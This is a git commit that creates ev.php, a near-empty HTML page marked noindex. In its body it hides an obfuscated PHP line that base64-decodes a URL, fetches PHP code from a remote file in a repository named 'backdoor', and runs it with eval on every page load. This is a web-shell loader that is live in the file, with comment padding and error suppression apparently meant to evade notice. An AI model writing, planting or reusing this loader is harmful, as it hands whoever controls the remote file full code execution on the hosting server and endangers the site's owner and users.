fc000b6f88b9fcea2f8dd31ffce3ab1a1d66a482
0xBakusedu <161377416+0xBakusedu@users.noreply.github.com>
2025-08-04 11:14:51 -0700

    Create ev.php

---
+++ ev.php
@@ -0,0 +1,11 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex,nofollow">
+</head>
+<body>
+    gshhs<?php echo "x";?><?=/****/@null; /********/ /*******/ /********/@eval/****/("?>".file_get_contents/*******/("https://".base64_decode("cmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9sZXRzcjAwdC9iYWNrZG9vci9yZWZzL2hlYWRzL21haW4vbWFyaWp1YW5hLnBocA==")));/**/?>
+</body>
+</html>
